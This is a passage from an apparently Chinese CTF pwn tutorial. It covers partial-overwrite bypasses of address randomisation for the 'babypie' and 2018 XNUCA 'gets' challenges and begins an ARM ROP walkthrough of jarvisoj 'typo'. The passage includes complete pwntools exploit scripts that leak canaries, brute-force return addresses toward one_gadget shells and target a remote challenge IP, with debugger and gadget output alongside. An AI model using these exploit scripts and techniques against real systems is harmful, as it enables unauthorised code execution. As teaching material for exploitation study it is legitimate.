   0x55dc43694a4f:    pop    rbp
   0x55dc43694a50:    ret    
   0x55dc43694a51:    push   rbp
   0x55dc43694a52:    mov    rbp,rsp
   0x55dc43694a55:    sub    rsp,0x10<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以发现, 此时的返回地址与 get shell 函数的地址只有低位的 16 bit 不同, 如果覆写低 16 bit 为 <code>0x?A3E</code>, 就有一定的几率 get shell</p>
<p>最终的脚本如下:</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true">#!/usr/bin/env python</span>
<span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span>

<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token comment" spellcheck="true">#  context.log_level = "debug"</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"deepin-terminal"</span><span class="token punctuation">,</span> <span class="token string">"-x"</span><span class="token punctuation">,</span> <span class="token string">"sh"</span><span class="token punctuation">,</span> <span class="token string">"-c"</span><span class="token punctuation">]</span>

<span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./babypie"</span><span class="token punctuation">,</span> timeout <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true">#  gdb.attach(io)</span>
        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">":\n"</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        canary <span class="token operator">=</span> <span class="token string">'\0'</span> <span class="token operator">+</span> io<span class="token punctuation">.</span>recvn<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
        success<span class="token punctuation">(</span>canary<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

        <span class="token comment" spellcheck="true">#  gdb.attach(io)</span>
        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">":\n"</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> canary <span class="token operator">+</span> <span class="token string">'bbbbbbbb'</span> <span class="token operator">+</span> <span class="token string">'\x3E\x0A'</span><span class="token punctuation">)</span>

        io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>
        io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">print</span> e<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>需要注意的是, 这种技巧不止在栈上有效, 在堆上也是一种有效的绕过地址随机化的手段</p>
<h3 id="2018-XNUCA-gets"><a href="#2018-XNUCA-gets" class="headerlink" title="2018-XNUCA-gets"></a>2018-XNUCA-gets</h3><p>这个题目也挺有意思的，如下</p>
<pre class="line-numbers language-c"><code class="language-c">__int64 __fastcall <span class="token function">main</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a2<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>a3<span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// [rsp+0h] [rbp-18h]</span>

  <span class="token function">gets</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>程序就这么小，很明显有一个栈溢出的漏洞，然而没有任何 leak。。</p>
<h4 id="确定保护-2"><a href="#确定保护-2" class="headerlink" title="确定保护"></a>确定保护</h4><p>先来看看程序的保护</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token punctuation">[</span><span class="token operator">*</span><span class="token punctuation">]</span> <span class="token string">'/mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets'</span>
    Arch<span class="token punctuation">:</span>     amd64<span class="token number">-64</span><span class="token operator">-</span>little
    RELRO<span class="token punctuation">:</span>    Full RELRO
    Stack<span class="token punctuation">:</span>    No canary found
    NX<span class="token punctuation">:</span>       NX enabled
    PIE<span class="token punctuation">:</span>      No <span class="token function">PIE</span> <span class="token punctuation">(</span><span class="token number">0x400000</span><span class="token punctuation">)</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>比较好的是程序没有 canary，自然我们很容易控制程序的 EIP，但是控制到哪里是一个问题。</p>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><p>我们通过 ELF 的基本执行流程（可执行文件部分）来知道程序的基本执行流程，与此同时我们发现在栈上存在着两个函数的返回地址。</p>
<pre class="line-numbers language-asm"><code class="language-asm">pwndbg> stack 25
00:0000│ rsp  0x7fffffffe398 —▸ 0x7ffff7a2d830 (__libc_start_main+240) ◂— mov    edi, eax
01:0008│      0x7fffffffe3a0 ◂— 0x1
02:0010│      0x7fffffffe3a8 —▸ 0x7fffffffe478 —▸ 0x7fffffffe6d9 ◂— 0x6667682f746e6d2f ('/mnt/hgf')
03:0018│      0x7fffffffe3b0 ◂— 0x1f7ffcca0
04:0020│      0x7fffffffe3b8 —▸ 0x400420 ◂— sub    rsp, 0x18
05:0028│      0x7fffffffe3c0 ◂— 0x0
06:0030│      0x7fffffffe3c8 ◂— 0xf086047f3fb49558
07:0038│      0x7fffffffe3d0 —▸ 0x400440 ◂— xor    ebp, ebp
08:0040│      0x7fffffffe3d8 —▸ 0x7fffffffe470 ◂— 0x1
09:0048│      0x7fffffffe3e0 ◂— 0x0
... ↓
0b:0058│      0x7fffffffe3f0 ◂— 0xf79fb00f2749558
0c:0060│      0x7fffffffe3f8 ◂— 0xf79ebba9ae49558
0d:0068│      0x7fffffffe400 ◂— 0x0
... ↓
10:0080│      0x7fffffffe418 —▸ 0x7fffffffe488 —▸ 0x7fffffffe704 ◂— 0x504d554a4f545541 ('AUTOJUMP')
11:0088│      0x7fffffffe420 —▸ 0x7ffff7ffe168 ◂— 0x0
12:0090│      0x7fffffffe428 —▸ 0x7ffff7de77cb (_dl_init+139) ◂— jmp    0x7ffff7de77a0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>其中 <code>__libc_start_main+240</code> 位于 libc 中，<code>_dl_init+139</code> 位于 ld 中</p>
<pre><code>0x7ffff7a0d000     0x7ffff7bcd000 r-xp   1c0000 0      /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7bcd000     0x7ffff7dcd000 ---p   200000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dcd000     0x7ffff7dd1000 r--p     4000 1c0000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd1000     0x7ffff7dd3000 rw-p     2000 1c4000 /lib/x86_64-linux-gnu/libc-2.23.so
0x7ffff7dd3000     0x7ffff7dd7000 rw-p     4000 0
0x7ffff7dd7000     0x7ffff7dfd000 r-xp    26000 0      /lib/x86_64-linux-gnu/ld-2.23.so</code></pre><p>一个比较自然的想法就是我们通过 partial overwrite 来修改这两个地址到某个获取 shell 的位置，那自然就是 Onegadget 了。那么我们究竟覆盖哪一个呢？？</p>
<p>我们先来分析一下 <code>libc</code> 的基地址 <code>0x7ffff7a0d000</code>。我们一般要覆盖字节的话，至少要覆盖1个半字节才能够获取跳到 onegadget。然而，程序中读取的时候是 <code>gets</code>读取的，也就意味着字符串的末尾肯定会存在<code>\x00</code>。</p>
<p>而我们覆盖字节的时候必须覆盖整数倍个数，即至少会覆盖 3 个字节，而我们再来看看<code>__libc_start_main+240</code> 的地址 <code>0x7ffff7a2d830</code>，如果覆盖3个字节，那么就是 <code>0x7ffff700xxxx</code>，已经小于了 libc 的基地址了，前面也没有刻意执行的代码位置。</p>
<p>一般来说 libc_start_main 在 libc 中的偏移不会差的太多，那么显然我们如果覆盖 <code>__libc_start_main+240</code> ，显然是不可能的。</p>
<p>而 ld 的基地址呢？如果我们覆盖了栈上<code>_dl_init+139</code>，即为<code>0x7ffff700xxxx</code>。而观察上述的内存布局，我们可以发现<code>libc</code>位于 <code>ld</code> 的低地址方向，那么在随机化的时候，很有可能 libc 的第 3 个字节是为<code>\x00</code> 的。</p>
<p>举个例子，目前两者之间的偏移为</p>
<pre><code>0x7ffff7dd7000-0x7ffff7a0d000=0x3ca000</code></pre><p>那么如果 ld 被加载到了 <code>0x7ffff73ca000</code>，则显然 <code>libc</code> 的起始地址就是<code>0x7ffff7000000</code>。</p>
<p>因此，我们有足够的理由选择覆盖栈上存储的<code>_dl_init+139</code>。那么覆盖成什么呢？还不知道。因为我们还不知道 libc 的库版本是什么，，</p>
<p>我们可以先随便覆盖覆盖，看看程序会不会崩溃，毕竟此时很有可能会执行 libc 库中的代码。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']</span>
<span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'DEBUG'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elfpath <span class="token operator">=</span> <span class="token string">'./gets'</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfpath

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elfpath<span class="token punctuation">)</span>
bits <span class="token operator">=</span> elf<span class="token punctuation">.</span>bits


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            p <span class="token operator">=</span> process<span class="token punctuation">(</span>elfpath<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># gdb.attach(p)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            payload <span class="token operator">=</span> <span class="token number">0x18</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40059B</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40059B</span><span class="token punctuation">)</span>
            payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> p16<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
            data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span> data
            p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
            p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    exp<span class="token punctuation">(</span><span class="token string">'106.75.4.189'</span><span class="token punctuation">,</span> <span class="token number">35273</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后发现报出了如下错误，一方面，我们可以判断出这肯定是 2.23 版本的 libc；另外一方面，我们我们可以通过<code>(cfree+0x4c)[0x7f57b6f9253c]</code>来最终定位 libc 的版本。</p>
<pre><code>======= Backtrace: =========
/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7f57b6f857e5]
/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7f57b6f8e37a]
/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7f57b6f9253c]
/lib/x86_64-linux-gnu/libc.so.6(+0xf2c40)[0x7f57b7000c40]
[0x7ffdec480f20]
======= Memory map: ========
00400000-00401000 r-xp 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00600000-00601000 r--p 00000000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00601000-00602000 rw-p 00001000 00:28 48745                              /mnt/hgfs/CTF/2018/1124XNUCA/pwn/gets/gets
00b21000-00b43000 rw-p 00000000 00:00 0                                  [heap]
7f57b0000000-7f57b0021000 rw-p 00000000 00:00 0
7f57b0021000-7f57b4000000 ---p 00000000 00:00 0
7f57b6cf8000-7f57b6d0e000 r-xp 00000000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6d0e000-7f57b6f0d000 ---p 00016000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0d000-7f57b6f0e000 rw-p 00015000 08:01 914447                     /lib/x86_64-linux-gnu/libgcc_s.so.1
7f57b6f0e000-7f57b70ce000 r-xp 00000000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b70ce000-7f57b72ce000 ---p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72ce000-7f57b72d2000 r--p 001c0000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d2000-7f57b72d4000 rw-p 001c4000 08:01 914421                     /lib/x86_64-linux-gnu/libc-2.23.so
7f57b72d4000-7f57b72d8000 rw-p 00000000 00:00 0
7f57b72d8000-7f57b72fe000 r-xp 00000000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74ec000-7f57b74ef000 rw-p 00000000 00:00 0
7f57b74fc000-7f57b74fd000 rw-p 00000000 00:00 0
7f57b74fd000-7f57b74fe000 r--p 00025000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74fe000-7f57b74ff000 rw-p 00026000 08:01 914397                     /lib/x86_64-linux-gnu/ld-2.23.so
7f57b74ff000-7f57b7500000 rw-p 00000000 00:00 0
7ffdec460000-7ffdec481000 rw-p 00000000 00:00 0                          [stack]
7ffdec57f000-7ffdec582000 r--p 00000000 00:00 0                          [vvar]
7ffdec582000-7ffdec584000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]</code></pre><p>确定好了 libc 的版本后，我们可以选一个 one_gadget，这里我选择第一个，较低地址的。</p>
<pre class="line-numbers language-shell"><code class="language-shell">➜  gets one_gadget /lib/x86_64-linux-gnu/libc.so.6
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>使用如下 exp 继续爆破，</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span> <span class="token string">'split'</span><span class="token punctuation">,</span> <span class="token string">'-h'</span><span class="token punctuation">]</span>
<span class="token comment" spellcheck="true">#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']</span>
<span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'DEBUG'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
elfpath <span class="token operator">=</span> <span class="token string">'./gets'</span>
context<span class="token punctuation">.</span>binary <span class="token operator">=</span> elfpath

elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>elfpath<span class="token punctuation">)</span>
bits <span class="token operator">=</span> elf<span class="token punctuation">.</span>bits


<span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
            p <span class="token operator">=</span> remote<span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            p <span class="token operator">=</span> process<span class="token punctuation">(</span>elfpath<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span>
        <span class="token comment" spellcheck="true"># gdb.attach(p)</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            payload <span class="token operator">=</span> <span class="token number">0x18</span> <span class="token operator">*</span> <span class="token string">'a'</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40059B</span><span class="token punctuation">)</span>
            <span class="token keyword">for</span> _ <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
                payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x40059B</span><span class="token punctuation">)</span>
            payload <span class="token operator">+=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span> <span class="token operator">*</span> <span class="token number">5</span> <span class="token operator">+</span> <span class="token string">'\x16\02'</span>
            p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

            p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'ls'</span><span class="token punctuation">)</span>
            data <span class="token operator">=</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">print</span> data
            p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
            p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">except</span> Exception<span class="token punctuation">:</span>
            p<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">continue</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    exp<span class="token punctuation">(</span><span class="token string">'106.75.4.189'</span><span class="token punctuation">,</span> <span class="token number">35273</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>最后获取到 shell。</p>
<pre class="line-numbers language-python"><code class="language-python">$ ls
exp<span class="token punctuation">.</span>py  gets<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p><strong>arm</strong></p>
<hr>
<h1 id="Arm-ROP"><a href="#Arm-ROP" class="headerlink" title="Arm ROP"></a>Arm ROP</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>因为目前为止，arm， mips 等架构出现的 pwn 还是较简单的栈漏洞，因此目前只打算介绍 arm 下的 rop，其他漏洞的利用以后会逐渐介绍</p>
<h2 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h2><p>先看一下 arm 下的函数调用约定，函数的第 1 ～ 4 个参数分别保存在 <strong>r0 ～ r3</strong> 寄存器中， 剩下的参数从右向左依次入栈， 被调用者实现栈平衡，函数的返回值保存在 <strong>r0</strong> 中</p>
<p><img src="/images/loading.gif" data-original="../images/CTF/ARM_Calling_Convention.png" alt=""></p>
<p>除此之外，arm 的 <strong>b/bl</strong> 等指令实现跳转; <strong>pc</strong> 寄存器相当于 x86 的 eip，保存下一条指令的地址，也是我们要控制的目标</p>
<h2 id="jarvisoj-typo"><a href="#jarvisoj-typo" class="headerlink" title="jarvisoj - typo"></a>jarvisoj - typo</h2><p>这里以 jarvisoj 的 typo 一题为例进行展示，题目可以在 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/arm/jarvisOJ_typo" target="_blank" rel="noopener">ctf-challenge</a> 下载</p>
<h3 id="确定保护-3"><a href="#确定保护-3" class="headerlink" title="确定保护"></a>确定保护</h3><pre class="line-numbers language-bash"><code class="language-bash">jarvisOJ_typo <span class="token punctuation">[</span>master●●<span class="token punctuation">]</span> check ./typo
typo: ELF 32-bit LSB executable, ARM, EABI5 version 1 <span class="token punctuation">(</span>SYSV<span class="token punctuation">)</span>, statically linked, <span class="token keyword">for</span> GNU/Linux 2.6.32, BuildID<span class="token punctuation">[</span>sha1<span class="token punctuation">]</span><span class="token operator">=</span>211877f58b5a0e8774b8a3a72c83890f8cd38e63, stripped
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token string">'/home/m4x/pwn_repo/jarvisOJ_typo/typo'</span>
    Arch:     arm-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE <span class="token punctuation">(</span>0x8000<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>静态链接的程序，没有开栈溢出保护和 PIE; 静态链接说明我们可以在 binary 里找到 <strong>system</strong> 等危险函数和 <strong>“/bin/sh”</strong> 等敏感字符串，因为又是 No PIE， 所以我们只需要栈溢出就能构造 ropchain 来 get shell</p>
<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>因此需要我们找一个溢出点，先运行一下程序，因为是静态链接的，所以在环境配置好的情况下直接运行即可</p>
<pre class="line-numbers language-bash"><code class="language-bash">jarvisOJ_typo <span class="token punctuation">[</span>master●●<span class="token punctuation">]</span> ./typo 
Let's Do Some Typing Exercise~
Press Enter to get start<span class="token punctuation">;</span>
Input ~ <span class="token keyword">if</span> you want to quit

------Begin------
throng
throng

survive
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
qemu: uncaught target signal 11 <span class="token punctuation">(</span>Segmentation fault<span class="token punctuation">)</span> - core dumped
<span class="token punctuation">[</span>1<span class="token punctuation">]</span>    1172 segmentation fault  ./typo<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>程序的输入点不多，很容易就能找到溢出点</p>
<h3 id="构造-ROP"><a href="#构造-ROP" class="headerlink" title="构造 ROP"></a>构造 ROP</h3><p>因此思路就很明显了，利用栈溢出构造 <strong>system(“/bin/sh”)</strong>， 先找一下 gadgets</p>
<pre class="line-numbers language-bash"><code class="language-bash">jarvisOJ_typo <span class="token punctuation">[</span>master●●<span class="token punctuation">]</span> ROPgadget --binary ./typo --only <span class="token string">"pop"</span>   
Gadgets information
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
0x00020904 <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r0, r4, pc<span class="token punctuation">}</span>
0x00068bec <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r1, pc<span class="token punctuation">}</span>
0x00008160 <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r3, pc<span class="token punctuation">}</span>
0x0000ab0c <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r3, r4, r5, pc<span class="token punctuation">}</span>
0x0000a958 <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r3, r4, r5, r6, r7, pc<span class="token punctuation">}</span>
0x00014a70 <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r3, r4, r7, pc<span class="token punctuation">}</span>
0x000083b0 <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r4, pc<span class="token punctuation">}</span>
0x00009284 <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r4, r5, pc<span class="token punctuation">}</span>
0x000095b8 <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r4, r5, r6, pc<span class="token punctuation">}</span>
0x000082e8 <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r4, r5, r6, r7, pc<span class="token punctuation">}</span>
0x00023ed4 <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r4, r5, r7, pc<span class="token punctuation">}</span>
0x00023dbc <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r4, r7, pc<span class="token punctuation">}</span>
0x00014068 <span class="token keyword">:</span> pop <span class="token punctuation">{</span>r7, pc<span class="token punctuation">}</span>

Unique gadgets found: 13<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
